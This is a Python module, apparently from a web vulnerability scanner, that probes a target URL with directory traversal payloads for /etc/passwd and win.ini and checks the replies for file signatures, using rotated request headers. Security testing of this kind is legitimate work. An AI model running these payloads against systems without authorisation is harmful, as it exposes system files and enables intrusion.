# app/core/scanners/dir_traversal.py
import aiohttp
import asyncio
from app.config.headers import get_rotated_headers
from app.config.ratelimiter import rate_limiter
from app.core.validator import validate_response

PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
]

SENSITIVE_SIGNATURES = ["root:x:", "[extensions]", "[fonts]", "Microsoft Windows"]

async def scan(target_url):
    findings = []

    async with aiohttp.ClientSession() as session:
        for payload in PAYLOADS:
            await rate_limiter.acquire()
            test_url = f"{target_url.rstrip('/')}/{payload}"
            try:
                async with session.get(test_url, headers=get_rotated_headers(), timeout=10) as resp:
                    body = await resp.text()
                    if any(sig in body for sig in SENSITIVE_SIGNATURES):
                        if validate_response(payload, resp):
                            findings.append({
                                "vulnerability": "Directory Traversal",
                                "payload": test_url,
                                "status": resp.status,
                                "signature": [sig for sig in SENSITIVE_SIGNATURES if sig in body],
                            })
            except Exception as e:
                continue
    return findings
